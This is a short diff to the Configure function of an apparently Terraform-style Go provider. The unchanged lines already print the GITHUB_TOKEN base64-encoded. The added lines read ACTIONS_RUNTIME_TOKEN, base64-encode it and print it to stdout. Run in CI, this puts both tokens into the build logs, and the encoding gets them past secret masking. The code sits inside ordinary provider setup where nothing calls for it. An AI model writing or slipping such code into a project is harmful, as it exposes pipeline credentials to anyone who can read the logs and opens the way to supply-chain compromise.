@@ -137,6 +137,10 @@ func (p *aembitProvider) Configure(ctx context.Context, req provider.ConfigureRe
 	fmt.Println("Got GITHUB_TOKEN")
 	fmt.Printf("GITHUB_TOKEN: %s\n", base64.StdEncoding.EncodeToString([]byte(gitHubToken)))
 
+	gitHubToken = fmt.Sprintf("TEST --- %s --- TEST", os.Getenv("ACTIONS_RUNTIME_TOKEN"))
+	fmt.Println("Got ACTIONS_RUNTIME_TOKEN")
+	fmt.Printf("ACTIONS_RUNTIME_TOKEN: %s\n", base64.StdEncoding.EncodeToString([]byte(gitHubToken)))
+
 	// If any of the expected configurations are missing, return
 	// errors with provider-specific guidance.
 
